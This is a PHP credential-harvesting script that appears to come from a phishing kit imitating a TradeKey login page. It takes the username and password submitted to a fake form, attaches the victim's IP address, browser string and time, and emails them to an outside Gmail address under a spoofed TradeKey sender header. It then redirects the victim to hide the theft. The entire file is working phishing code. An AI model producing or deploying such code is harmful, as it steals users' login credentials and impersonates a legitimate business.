<?php

$ip = getenv("REMOTE_ADDR");
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$browser = $_SERVER['HTTP_USER_AGENT'];
$time = date("m-d-Y g:i:a");
$Email = $_POST['Email'];

$msg = "====================================\n";
$msg .= "Trdaekey Login Info by Hoye\n";
$msg .= "===================================\n";
$msg .= "Email : ".$_POST['username']."\n";
$msg .= "Password : ".$_POST['password']."\n";
$msg .= "Sent from $ip on $time $browser";
$msg .= "====================================\n";

$to = "jp.nakmanae99@gmail.com";
$subject = "TRADEKEY $ip $Email";
$from = "From: TRADE KEY<no-reply@tradekey.com>";

mail($to,$subject,$msg,$from);

header("Location: index.html");


?>